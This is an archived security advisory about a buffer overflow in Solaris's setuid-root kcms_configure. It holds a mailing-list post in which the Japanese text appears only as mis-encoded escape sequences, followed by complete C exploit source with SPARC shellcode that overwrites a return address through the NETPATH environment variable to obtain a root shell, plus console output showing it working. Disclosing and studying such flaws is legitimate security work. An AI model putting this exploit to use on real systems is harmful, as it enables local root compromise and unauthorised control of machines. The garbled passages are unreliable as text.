source: http://www.securityfocus.com/bid/452/info
 
 
There is an unchecked sprintf() call in the versions of /usr/openwin/bin/kcms_configure shipped with solaris 2.5, 2.5.1 and 2.6. Unfortunately, kcms_configure is installed setuid root, making it possible for an attacker to overflow the buffer and have arbitrary code executed with superuser privileges. The consequence of this vulnerability being exploited is a local root compromise.

UNYUN@ShadowPenguinSecurity$B$G$9(B

$B<+8J%l%9$G$9!#(B

> $B$J$*!"(BSolaris7 Sparc Edition$B$K$bF1MM$NLdBj$,$"$j$^$9$,!"(B
> Solaris2.6(Sparc)$B$G$O:F8=$7$^$;$s$G$7$?!#(B

Solaris 2.6 (Sparc)$B$G$b:F8=$9$k$h$&$G$9!#(B
Solaris 2.6 (Sparc)$B$O%3%s%=!<%k%m%0%$%s$7$?>uBV$G%A%'%C%/$7$?$N$G$9$,!"%3(B
$B%s%=!<%k%m%0%$%s$@$H$3$NLdBj$O(BSolaris7$B$G$b:F8=$7$J$$$h$&$G$9!#%M%C%H%o!<(B
$B%/7PM3$G$N$_:F8=$9$k$h$&$G!"B>$N%^%7%s$+$i$N(Btelnet$B$K$F(BSolaris2.6 (Sparc)
$B$G$b:F8=$9$k$3$H$,3NG'$5$l$^$7$?!#$*$=$i$/!"(Bintel$BHG(BSolaris2.6$B$bF1MM$@$H;W(B
$B$o$l$^$9!#(B

case 1: exploit$B2DG=(B

hoge : $B%3%s%=!<%k%m%0%$%s(B

hoge# xhost +vul
hoge# telnet vul
Login:
Password:
vul% setenv DISPLAY hoge:0.0
vul% gcc ex_kcms_configuresp.c
vul% ./a.out
#

case 2: exploit$BIT2DG=(B

hoge : $B%3%s%=!<%k%m%0%$%s(B

hoge% gcc ex_kcms_configuresp.c
hoge% ./a.out
The specified profile could not be opened
getlasterrorhoge%
hoge%

Sparc$B$N>l9g!"%*%U%;%C%H(B2092-2093,2112-2115$B$r(Bfake$B$9$k$3$H$K$h$j!"%*%U%;%C(B
$B%H(B2116-2119$B$N(BRET$B$,M-8z$H$J$k$h$&$G!"(Bintel$BHGF1MM$K%m!<%+%k%f!<%6!<$,(Broot$B8"(B
$B8B$rC%<h$G$-$k$3$H$,3NG'$5$l$^$7$?!#$J$*!"%3!<%I@)8B$O(BIntel$BHG$h$j2?8N$+4E(B
$B$/$J$C$F$$$k$h$&$G$9!&!&!&(B

---- ex_kcms_configuresp.c
/*=============================================================================
   kcms_configure Exploit for Solaris2.6/7 Sparc Edition
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#define ENV         "NETPATH="
#define MAXBUF      3000
#define RETADR      2116
#define RETOFS      0x1300
#define EXPADR      1200
#define FAKEADR1    2092
#define FAKEADR2    2112
#define NOP         0xa61cc013

char exploit_code[] =
"\x82\x10\x20\x17\x91\xd0\x20\x08"
"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd4\xff\xff";

unsigned long get_sp(void)
{
__asm__("mov %sp,%i0 \n");
}

main()
{
    char            buf[MAXBUF];
    unsigned int    i,ip,sp;

    putenv("LANG=");
    sp=get_sp();
    printf("ESP =0x%x\n",sp);

    for (i=0;i<MAXBUF-4;i+=4){
        buf[i+3]=NOP&0xff;
        buf[i+2]=(NOP>>8)&0xff;
        buf[i+1]=(NOP>>16)&0xff;
        buf[i  ]=(NOP>>24)&0xff;
    }

    ip=sp;
    printf("FAKE=0x%x\n",sp);
    buf[FAKEADR1+3]=ip&0xff;
    buf[FAKEADR1+2]=(ip>>8)&0xff;
    buf[FAKEADR1+1]=(ip>>16)&0xff;
    buf[FAKEADR1  ]=(ip>>24)&0xff;
    buf[FAKEADR2+3]=ip&0xff;
    buf[FAKEADR2+2]=(ip>>8)&0xff;
    buf[FAKEADR2+1]=(ip>>16)&0xff;
    buf[FAKEADR2  ]=(ip>>24)&0xff;

    ip=sp-RETOFS;
    printf("EIP =0x%x\n",sp);
    buf[RETADR+3]=ip&0xff;
    buf[RETADR+2]=(ip>>8)&0xff;
    buf[RETADR+1]=(ip>>16)&0xff;
    buf[RETADR]=(ip>>24)&0xff;

    strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));

    strncpy(buf,ENV,strlen(ENV));
    buf[MAXBUF-1]=0;
    putenv(buf);

    execl("/usr/openwin/bin/kcms_configure","kcms_configure","1",0);
}
